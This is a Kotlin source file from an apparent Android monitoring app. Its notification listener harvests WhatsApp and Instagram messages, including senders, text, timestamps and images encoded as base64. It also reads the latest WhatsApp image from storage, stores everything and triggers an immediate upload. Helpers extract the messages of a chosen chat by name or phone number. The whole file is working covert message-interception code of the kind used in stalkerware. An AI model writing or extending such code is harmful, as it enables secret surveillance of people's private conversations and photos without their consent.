package com.spapp.monitoring.collectors

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import com.spapp.monitoring.data.local.InstagramMessageEntry
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Listens to incoming and active system notifications for messaging apps (e.g. WhatsApp & WhatsApp Business).
 * Captures chat messages with sender name, text, and timestamp in real-time
 * even when WhatsApp is running in the background.
 */
class WhatsAppNotificationListener : NotificationListenerService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onListenerConnected() {
        super.onListenerConnected()
        instance = this
        processAllActiveNotifications()
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
    }

    fun processAllActiveNotifications() {
        try {
            val activeNotifs = activeNotifications
            if (activeNotifs != null) {
                for (sbn in activeNotifs) {
                    processNotification(sbn)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to read active notifications", e)
        }
    }


    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return
        processNotification(sbn)
    }

    private fun processNotification(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        if (pkg == "com.instagram.android") {
            processInstagramNotification(sbn)
            return
        }
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
        val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
        val text = if (!bigText.isNullOrBlank()) bigText else normalText
        val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
        val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
        // Extract exact real message timestamp from WhatsApp notification
        val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()

        // Extract real image thumbnail if present in notification extras
        var mediaType: String? = null
        var mediaPath: String? = null

        val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
            ?: (extras.get("android.picture") as? android.graphics.Bitmap)
            ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)

        if (pictureBitmap != null) {
            try {
                val stream = java.io.ByteArrayOutputStream()
                pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, stream)
                val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                mediaType = "image"
                mediaPath = "data:image/jpeg;base64,$base64"
            } catch (_: Exception) {}
        } else if (text?.contains("📷") == true || text?.contains("Photo", ignoreCase = true) == true) {
            mediaType = "image"
            try {
                mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
            } catch (_: Exception) {}
        }

        // Determine chat name: conversation title (groups) > title > fallback
        val chatName = when {
            !convoTitle.isNullOrBlank() -> convoTitle
            !title.isNullOrBlank() && title != "WhatsApp" && title != "WhatsApp Business" -> title
            else -> title ?: "WhatsApp"
        }

        // Skip non-message service notifications
        val checkStr = "${title.orEmpty()} ${text.orEmpty()}".lowercase()
        if (checkStr.contains("checking for new messages") ||
            checkStr.contains("whatsapp web is active") ||
            checkStr.contains("backup in progress") ||
            checkStr.contains("deleting messages")
        ) {
            return
        }

        val entries = mutableListOf<WhatsAppMessageEntry>()

        // 1. Android MessagingStyle bundled messages (android.messages & android.historicMessages)
        val messageBundles = extras.getParcelableArray("android.messages")
        val historicBundles = extras.getParcelableArray("android.historicMessages")
        val allBundles = mutableListOf<android.os.Bundle>()
        if (historicBundles != null) {
            for (item in historicBundles) {
                if (item is android.os.Bundle) allBundles.add(item)
            }
        }
        if (messageBundles != null) {
            for (item in messageBundles) {
                if (item is android.os.Bundle) allBundles.add(item)
            }
        }

        if (allBundles.isNotEmpty()) {
            for (b in allBundles) {
                val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
                if (bText.isBlank()) continue
                val bTime = b.getLong("time", postTime)
                val rawSender = b.getCharSequence("sender")?.toString()?.trim()
                val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
                val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
                val isOutgoing = isMeExplicit || hasYouPrefix || (rawSender == null && !convoTitle.isNullOrBlank())

                val cleanText = if (bText.startsWith("You: ", ignoreCase = true)) bText.substring(5).trim() else bText

                entries += WhatsAppMessageEntry(
                    chatName = chatName,
                    sender = if (isOutgoing) "me" else (rawSender ?: title ?: chatName),
                    messageText = cleanText,
                    isOutgoing = isOutgoing,
                    messageTimeEpochMs = if (bTime > 0) bTime else postTime,
                    mediaType = mediaType,
                    mediaPath = mediaPath
                )
            }
        } else if (!textLines.isNullOrEmpty()) {
            // 2. InboxStyle / multi-message bundled notification lines fallback
            for (line in textLines) {
                val lineStr = line?.toString()?.trim() ?: continue
                if (lineStr.isBlank()) continue
                val colonIdx = lineStr.indexOf(':')
                val (sender, msg) = if (colonIdx > 0 && colonIdx < lineStr.length - 1) {
                    val s = lineStr.substring(0, colonIdx).trim()
                    val m = lineStr.substring(colonIdx + 1).trim()
                    Pair(s, m)
                } else {
                    Pair(title ?: chatName, lineStr)
                }
                val isLineOutgoing = sender.equals("You", ignoreCase = true) || sender.equals("Me", ignoreCase = true) || msg.startsWith("You: ", ignoreCase = true)
                val cleanMsg = if (msg.startsWith("You: ", ignoreCase = true)) msg.substring(5).trim() else msg
                entries += WhatsAppMessageEntry(
                    chatName = chatName,
                    sender = if (isLineOutgoing) "me" else sender,
                    messageText = cleanMsg,
                    isOutgoing = isLineOutgoing,
                    messageTimeEpochMs = postTime,
                    mediaType = mediaType,
                    mediaPath = mediaPath
                )
            }
        } else if (!text.isNullOrBlank() && !text.matches(Regex("^\\d+\\s+new messages?.*", RegexOption.IGNORE_CASE))) {
            val isSingleOutgoing = text.startsWith("You: ", ignoreCase = true) || text.startsWith("You reacted ", ignoreCase = true) || (title != null && (title.equals("You", ignoreCase = true) || title.equals("Me", ignoreCase = true)))
            val cleanSingle = if (text.startsWith("You: ", ignoreCase = true)) text.substring(5).trim() else text
            entries += WhatsAppMessageEntry(
                chatName = chatName,
                sender = if (isSingleOutgoing) "me" else (title ?: chatName),
                messageText = cleanSingle,
                isOutgoing = isSingleOutgoing,
                messageTimeEpochMs = postTime,
                mediaType = mediaType,
                mediaPath = mediaPath
            )
        }

        if (entries.isNotEmpty()) {
            scope.launch {
                try {
                    val db = AppDatabase.getInstance(applicationContext)
                    db.whatsAppMessageDao().insertAll(entries)
                    RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to record WhatsApp notification message", e)
                }
            }
        }
    }

    /**
     * Extracts all messages for a specific chat from current active notifications
     * filtered to those within the given cutoff time (e.g. last 2 days).
     */
    fun extractMessagesForChat(chatName: String, cutoffTimeMs: Long, phoneDigits: String? = null): List<WhatsAppMessageEntry> {
        val results = mutableListOf<WhatsAppMessageEntry>()
        val activeNotifs = try { activeNotifications } catch (_: Exception) { null } ?: return emptyList()

        for (sbn in activeNotifs) {
            val pkg = sbn.packageName ?: continue
            if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") continue
            val notification = sbn.notification ?: continue
            val extras = notification.extras ?: continue

            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
            val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
            val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()?.trim()
            val cleanChatName = chatName.trim()

            val notGeneric = title != null && !title.equals("WhatsApp", ignoreCase = true) && !title.equals("WhatsApp Business", ignoreCase = true)
            val digitsMatch = if (!phoneDigits.isNullOrBlank() && phoneDigits.length >= 7) {
                val tDig = title?.filter { it.isDigit() } ?: ""
                val cDig = convoTitle?.filter { it.isDigit() } ?: ""
                val sDig = subText?.filter { it.isDigit() } ?: ""
                tDig.contains(phoneDigits) || cDig.contains(phoneDigits) || sDig.contains(phoneDigits)
            } else false

            val matchesChat = (convoTitle != null && (convoTitle.equals(cleanChatName, ignoreCase = true) || (cleanChatName.length >= 3 && convoTitle.contains(cleanChatName, ignoreCase = true)) || (convoTitle.length >= 3 && cleanChatName.contains(convoTitle, ignoreCase = true)))) ||
                              (notGeneric && (title!!.equals(cleanChatName, ignoreCase = true) || (cleanChatName.length >= 3 && title.contains(cleanChatName, ignoreCase = true)) || (title.length >= 3 && cleanChatName.contains(title, ignoreCase = true)))) ||
                              (subText != null && (subText.equals(cleanChatName, ignoreCase = true) || (cleanChatName.length >= 3 && subText.contains(cleanChatName, ignoreCase = true)) || (subText.length >= 3 && cleanChatName.contains(subText, ignoreCase = true)))) ||
                              digitsMatch

            if (!matchesChat) continue

            val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()

            val messageBundles = extras.getParcelableArray("android.messages")
            val historicBundles = extras.getParcelableArray("android.historicMessages")
            val allBundles = mutableListOf<android.os.Bundle>()
            if (historicBundles != null) {
                for (item in historicBundles) {
                    if (item is android.os.Bundle) allBundles.add(item)
                }
            }
            if (messageBundles != null) {
                for (item in messageBundles) {
                    if (item is android.os.Bundle) allBundles.add(item)
                }
            }

            if (allBundles.isNotEmpty()) {
                for (b in allBundles) {
                    val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
                    if (bText.isBlank()) continue
                    val bTime = b.getLong("time", postTime)
                    if (bTime < cutoffTimeMs) continue

                    val rawSender = b.getCharSequence("sender")?.toString()?.trim()
                    val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
                    val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
                    val isOutgoing = isMeExplicit || hasYouPrefix || (rawSender == null && !convoTitle.isNullOrBlank())

                    val cleanText = if (bText.startsWith("You: ", ignoreCase = true)) bText.substring(5).trim() else bText

                    results += WhatsAppMessageEntry(
                        chatName = cleanChatName,
                        sender = if (isOutgoing) "me" else (rawSender ?: title ?: cleanChatName),
                        messageText = cleanText,
                        isOutgoing = isOutgoing,
                        messageTimeEpochMs = bTime
                    )
                }
            } else {
                val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
                if (!textLines.isNullOrEmpty()) {
                    for (line in textLines) {
                        val lineStr = line?.toString()?.trim() ?: continue
                        if (lineStr.isBlank()) continue
                        if (postTime < cutoffTimeMs) continue
                        val colonIdx = lineStr.indexOf(':')
                        val (s, m) = if (colonIdx > 0 && colonIdx < lineStr.length - 1) {
                            Pair(lineStr.substring(0, colonIdx).trim(), lineStr.substring(colonIdx + 1).trim())
                        } else {
                            Pair(title ?: cleanChatName, lineStr)
                        }
                        val isLineOutgoing = s.equals("You", ignoreCase = true) || s.equals("Me", ignoreCase = true) || m.startsWith("You: ", ignoreCase = true)
                        val cleanMsg = if (m.startsWith("You: ", ignoreCase = true)) m.substring(5).trim() else m

                        results += WhatsAppMessageEntry(
                            chatName = cleanChatName,
                            sender = if (isLineOutgoing) "me" else s,
                            messageText = cleanMsg,
                            isOutgoing = isLineOutgoing,
                            messageTimeEpochMs = postTime
                        )
                    }
                } else {
                    val singleText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
                        ?: extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
                    if (!singleText.isNullOrBlank() && postTime >= cutoffTimeMs) {
                        val isSingleOutgoing = singleText.startsWith("You: ", ignoreCase = true) || singleText.startsWith("You reacted ", ignoreCase = true) || (title != null && (title.equals("You", ignoreCase = true) || title.equals("Me", ignoreCase = true)))
                        val cleanSingle = if (singleText.startsWith("You: ", ignoreCase = true)) singleText.substring(5).trim() else singleText

                        results += WhatsAppMessageEntry(
                            chatName = cleanChatName,
                            sender = if (isSingleOutgoing) "me" else (title ?: cleanChatName),
                            messageText = cleanSingle,
                            isOutgoing = isSingleOutgoing,
                            messageTimeEpochMs = postTime
                        )
                    }
                }
            }
        }

        return results
    }

    private fun processInstagramNotification(sbn: StatusBarNotification) {
        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
        val normalText = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
        val text = if (!bigText.isNullOrBlank()) bigText else normalText
        val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
        val textLines = extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
        val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()

        var mediaType: String? = null
        var mediaPath: String? = null

        val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
            ?: (extras.get("android.picture") as? android.graphics.Bitmap)
            ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)

        if (pictureBitmap != null) {
            try {
                val stream = java.io.ByteArrayOutputStream()
                pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
                val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                mediaPath = "data:image/jpeg;base64,$base64"
                mediaType = "image"
            } catch (_: Exception) {}
        }

        val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()?.trim()
        val summaryText = extras.getCharSequence("android.summaryText")?.toString()?.trim()
        val bigTitle = extras.getCharSequence("android.title.big")?.toString()?.trim()

        var chatName = when {
            !convoTitle.isNullOrBlank() -> convoTitle
            !bigTitle.isNullOrBlank() && !bigTitle.equals("Instagram", ignoreCase = true) -> bigTitle
            !title.isNullOrBlank() && !title.equals("Instagram", ignoreCase = true) -> title
            !subText.isNullOrBlank() && !subText.equals("Instagram", ignoreCase = true) -> subText
            !summaryText.isNullOrBlank() && !summaryText.equals("Instagram", ignoreCase = true) -> summaryText
            else -> "Instagram User"
        }

        // If chatName is generic, extract sender from text prefix ("user: text", "user sent a reel", etc.)
        if (chatName.equals("Instagram", ignoreCase = true) || chatName.equals("Instagram User", ignoreCase = true)) {
            val candidate = text ?: ""
            val colonIdx = candidate.indexOf(':')
            if (colonIdx in 1..40) {
                chatName = candidate.substring(0, colonIdx).trim()
            } else if (candidate.contains(" sent ", ignoreCase = true)) {
                val idx = candidate.indexOf(" sent ", ignoreCase = true)
                if (idx in 1..40) {
                    chatName = candidate.substring(0, idx).trim()
                }
            } else if (candidate.contains(" shared ", ignoreCase = true)) {
                val idx = candidate.indexOf(" shared ", ignoreCase = true)
                if (idx in 1..40) {
                    chatName = candidate.substring(0, idx).trim()
                }
            }
        }

        fun extractReelUrl(txt: String?): String? {
            if (txt.isNullOrBlank()) return null
            val match = "(https?://(?:www\\.)?instagram\\.com/(?:reel|p|tv)/[a-zA-Z0-9_-]+)".toRegex().find(txt)
            return match?.value
        }

        val entries = mutableListOf<InstagramMessageEntry>()

        val messageBundles = extras.getParcelableArray("android.messages")
        val historicBundles = extras.getParcelableArray("android.historicMessages")
        val allBundles = mutableListOf<android.os.Bundle>()
        if (historicBundles != null) {
            for (item in historicBundles) {
                if (item is android.os.Bundle) allBundles.add(item)
            }
        }
        if (messageBundles != null) {
            for (item in messageBundles) {
                if (item is android.os.Bundle) allBundles.add(item)
            }
        }

        if (allBundles.isNotEmpty()) {
            for (b in allBundles) {
                val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
                if (bText.isBlank()) continue
                val bTime = b.getLong("time", postTime)
                val rawSender = b.getCharSequence("sender")?.toString()?.trim()
                val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You sent ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
                val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
                val isOutgoing = isMeExplicit || hasYouPrefix || (rawSender == null && !convoTitle.isNullOrBlank())

                val cleanText = when {
                    bText.startsWith("You: ", ignoreCase = true) -> bText.substring(5).trim()
                    bText.startsWith("You sent ", ignoreCase = true) -> bText.substring(9).trim()
                    else -> bText
                }

                val foundReel = extractReelUrl(cleanText)
                val itemMediaType = when {
                    foundReel != null || cleanText.contains("reel", ignoreCase = true) -> "reel"
                    mediaType != null -> mediaType
                    cleanText.contains("photo", ignoreCase = true) -> "image"
                    cleanText.contains("video", ignoreCase = true) -> "video"
                    else -> null
                }

                entries += InstagramMessageEntry(
                    chatName = chatName,
                    sender = if (isOutgoing) "me" else (rawSender ?: title ?: chatName),
                    messageText = cleanText,
                    isOutgoing = isOutgoing,
                    messageTimeEpochMs = if (bTime > 0) bTime else postTime,
                    mediaType = itemMediaType,
                    mediaPath = mediaPath,
                    reelUrl = foundReel
                )
            }
        } else if (!textLines.isNullOrEmpty()) {
            for (line in textLines) {
                val lStr = line?.toString()?.trim() ?: continue
                if (lStr.isBlank()) continue
                val isOutgoing = lStr.startsWith("You: ", ignoreCase = true) || lStr.startsWith("You sent ", ignoreCase = true)
                val clean = when {
                    lStr.startsWith("You: ", ignoreCase = true) -> lStr.substring(5).trim()
                    lStr.startsWith("You sent ", ignoreCase = true) -> lStr.substring(9).trim()
                    else -> lStr
                }
                val foundReel = extractReelUrl(clean)
                val itemMediaType = when {
                    foundReel != null || clean.contains("reel", ignoreCase = true) -> "reel"
                    mediaType != null -> mediaType
                    else -> null
                }
                entries += InstagramMessageEntry(
                    chatName = chatName,
                    sender = if (isOutgoing) "me" else (title ?: chatName),
                    messageText = clean,
                    isOutgoing = isOutgoing,
                    messageTimeEpochMs = postTime,
                    mediaType = itemMediaType,
                    mediaPath = mediaPath,
                    reelUrl = foundReel
                )
            }
        } else if (!text.isNullOrBlank()) {
            val hasYouPrefix = text.startsWith("You: ", ignoreCase = true) || text.startsWith("You sent ", ignoreCase = true)
            val clean = when {
                text.startsWith("You: ", ignoreCase = true) -> text.substring(5).trim()
                text.startsWith("You sent ", ignoreCase = true) -> text.substring(9).trim()
                else -> text
            }
            val foundReel = extractReelUrl(clean)
            val itemMediaType = when {
                foundReel != null || clean.contains("reel", ignoreCase = true) -> "reel"
                mediaType != null -> mediaType
                clean.contains("photo", ignoreCase = true) -> "image"
                clean.contains("video", ignoreCase = true) -> "video"
                else -> null
            }
            entries += InstagramMessageEntry(
                chatName = chatName,
                sender = if (hasYouPrefix) "me" else (title ?: chatName),
                messageText = clean,
                isOutgoing = hasYouPrefix,
                messageTimeEpochMs = postTime,
                mediaType = itemMediaType,
                mediaPath = mediaPath,
                reelUrl = foundReel
            )
        }

        if (entries.isNotEmpty()) {
            scope.launch {
                try {
                    val db = AppDatabase.getInstance(applicationContext)
                    db.instagramMessageDao().insertAll(entries)
                    Log.d(TAG, "Saved ${entries.size} Instagram messages for $chatName")
                    com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to save Instagram messages", e)
                }
            }
        }
    }

    fun extractMessagesForInstagramChat(
        targetChatName: String,
        cutoffTimeMs: Long
    ): List<InstagramMessageEntry> {
        val cleanChatName = targetChatName.trim()
        val results = mutableListOf<InstagramMessageEntry>()
        val activeNotifs = activeNotifications ?: return emptyList()

        fun extractReelUrl(txt: String?): String? {
            if (txt.isNullOrBlank()) return null
            val match = "(https?://(?:www\\.)?instagram\\.com/(?:reel|p|tv)/[a-zA-Z0-9_-]+)".toRegex().find(txt)
            return match?.value
        }

        for (sbn in activeNotifs) {
            val pkg = sbn.packageName ?: continue
            if (pkg != "com.instagram.android") continue

            val notification = sbn.notification ?: continue
            val extras = notification.extras ?: continue

            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
            val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
            val notifChat = convoTitle ?: title ?: ""

            val isMatch = notifChat.equals(cleanChatName, ignoreCase = true) ||
                    (cleanChatName.length >= 3 && notifChat.contains(cleanChatName, ignoreCase = true)) ||
                    (notifChat.length >= 3 && cleanChatName.contains(notifChat, ignoreCase = true))

            if (!isMatch) continue

            val postTime = if (notification.`when` > 0) notification.`when` else if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()

            var mediaType: String? = null
            var mediaPath: String? = null
            val pictureBitmap = (extras.get(Notification.EXTRA_PICTURE) as? android.graphics.Bitmap)
                ?: (extras.get("android.picture") as? android.graphics.Bitmap)
                ?: (extras.get(Notification.EXTRA_LARGE_ICON_BIG) as? android.graphics.Bitmap)

            if (pictureBitmap != null) {
                try {
                    val stream = java.io.ByteArrayOutputStream()
                    pictureBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
                    val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                    mediaPath = "data:image/jpeg;base64,$base64"
                    mediaType = "image"
                } catch (_: Exception) {}
            }

            val messageBundles = extras.getParcelableArray("android.messages")
            val historicBundles = extras.getParcelableArray("android.historicMessages")
            val allBundles = mutableListOf<android.os.Bundle>()
            if (historicBundles != null) {
                for (item in historicBundles) {
                    if (item is android.os.Bundle) allBundles.add(item)
                }
            }
            if (messageBundles != null) {
                for (item in messageBundles) {
                    if (item is android.os.Bundle) allBundles.add(item)
                }
            }

            if (allBundles.isNotEmpty()) {
                for (b in allBundles) {
                    val bText = b.getCharSequence("text")?.toString()?.trim() ?: continue
                    if (bText.isBlank()) continue
                    val bTime = b.getLong("time", postTime)
                    if (bTime < cutoffTimeMs) continue

                    val rawSender = b.getCharSequence("sender")?.toString()?.trim()
                    val hasYouPrefix = bText.startsWith("You: ", ignoreCase = true) || bText.startsWith("You sent ", ignoreCase = true) || bText.startsWith("You reacted ", ignoreCase = true)
                    val isMeExplicit = rawSender?.equals("me", ignoreCase = true) == true || rawSender?.equals("you", ignoreCase = true) == true
                    val isOutgoing = isMeExplicit || hasYouPrefix || (rawSender == null && !convoTitle.isNullOrBlank())

                    val cleanText = when {
                        bText.startsWith("You: ", ignoreCase = true) -> bText.substring(5).trim()
                        bText.startsWith("You sent ", ignoreCase = true) -> bText.substring(9).trim()
                        else -> bText
                    }

                    val foundReel = extractReelUrl(cleanText)
                    val itemMediaType = when {
                        foundReel != null || cleanText.contains("reel", ignoreCase = true) -> "reel"
                        mediaType != null -> mediaType
                        cleanText.contains("photo", ignoreCase = true) -> "image"
                        cleanText.contains("video", ignoreCase = true) -> "video"
                        else -> null
                    }

                    results += InstagramMessageEntry(
                        chatName = cleanChatName,
                        sender = if (isOutgoing) "me" else (rawSender ?: title ?: cleanChatName),
                        messageText = cleanText,
                        isOutgoing = isOutgoing,
                        messageTimeEpochMs = bTime,
                        mediaType = itemMediaType,
                        mediaPath = mediaPath,
                        reelUrl = foundReel
                    )
                }
            } else {
                val singleText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
                    ?: extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
                if (!singleText.isNullOrBlank() && postTime >= cutoffTimeMs) {
                    val isSingleOutgoing = singleText.startsWith("You: ", ignoreCase = true) || singleText.startsWith("You sent ", ignoreCase = true) || singleText.startsWith("You reacted ", ignoreCase = true)
                    val cleanSingle = when {
                        singleText.startsWith("You: ", ignoreCase = true) -> singleText.substring(5).trim()
                        singleText.startsWith("You sent ", ignoreCase = true) -> singleText.substring(9).trim()
                        else -> singleText
                    }
                    val foundReel = extractReelUrl(cleanSingle)
                    val itemMediaType = when {
                        foundReel != null || cleanSingle.contains("reel", ignoreCase = true) -> "reel"
                        mediaType != null -> mediaType
                        cleanSingle.contains("photo", ignoreCase = true) -> "image"
                        cleanSingle.contains("video", ignoreCase = true) -> "video"
                        else -> null
                    }
                    results += InstagramMessageEntry(
                        chatName = cleanChatName,
                        sender = if (isSingleOutgoing) "me" else (title ?: cleanChatName),
                        messageText = cleanSingle,
                        isOutgoing = isSingleOutgoing,
                        messageTimeEpochMs = postTime,
                        mediaType = itemMediaType,
                        mediaPath = mediaPath,
                        reelUrl = foundReel
                    )
                }
            }
        }
        return results
    }

    companion object {
        private const val TAG = "WhatsAppNotification"
        @Volatile
        var instance: WhatsAppNotificationListener? = null
            private set

        fun getActiveChatNames(): List<String> {
            val inst = instance ?: return emptyList()
            val names = mutableListOf<String>()
            try {
                val activeNotifs = inst.activeNotifications ?: return emptyList()
                for (sbn in activeNotifs) {
                    val pkg = sbn.packageName ?: continue
                    if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") continue
                    val extras = sbn.notification?.extras ?: continue
                    val convoTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()?.trim()
                    val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
                    val candidate = when {
                        !convoTitle.isNullOrBlank() -> convoTitle
                        !title.isNullOrBlank() && !title.equals("WhatsApp", ignoreCase = true) && !title.equals("WhatsApp Business", ignoreCase = true) -> title
                        else -> null
                    }
                    if (!candidate.isNullOrBlank() && !names.contains(candidate)) {
                        names.add(candidate)
                    }
                }
            } catch (_: Exception) {}
            return names
        }
    }
}
